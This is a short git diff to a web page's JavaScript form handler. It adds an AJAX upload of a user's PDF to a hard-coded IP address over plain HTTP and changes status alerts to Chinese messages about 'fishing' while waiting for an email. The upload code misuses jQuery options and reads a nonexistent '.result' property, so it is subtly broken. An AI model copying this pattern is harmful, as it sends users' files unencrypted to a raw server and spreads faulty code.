@@ -59,6 +59,21 @@ function submit_translate_info() {
         return
     }
     console.log(receiver_email);
+    let pdf_upload_url = 'http://180.76.244.130:3000/games/savePDF';
+    let pdf_data = document.getElementById('pdf_file').result;
+    $.ajax({
+        url: pdf_upload_url,
+        type: 'multipart/form-data',
+        data: pdf_data,
+        success: function(data) {
+            console.log("文件上传成功");
+            //alert("savePDFInfo Success");
+        },
+        error: function(err) {
+            console.log("savePDFInfo Failure");
+            alert("ERROR:开始钓鱼失败，请重试");
+        }
+    });
     let pdf_query_url = 'http://180.76.244.130:3000/games/saveTranslateInfo';
     let d = new Date();
     $.ajax({
@@ -71,11 +86,11 @@ function submit_translate_info() {
         },
         success: function(data) {
             console.log("savePDFInfo Success");
-            alert("savePDFInfo Success");
+            alert("钓鱼中。。。请耐心等待邮件");
         },
         error: function(err) {
             console.log("savePDFInfo Failure");
-            alert("savePDFInfo Failure");
+            alert("ERROR:开始钓鱼失败，请重试");
         }
     });
 }
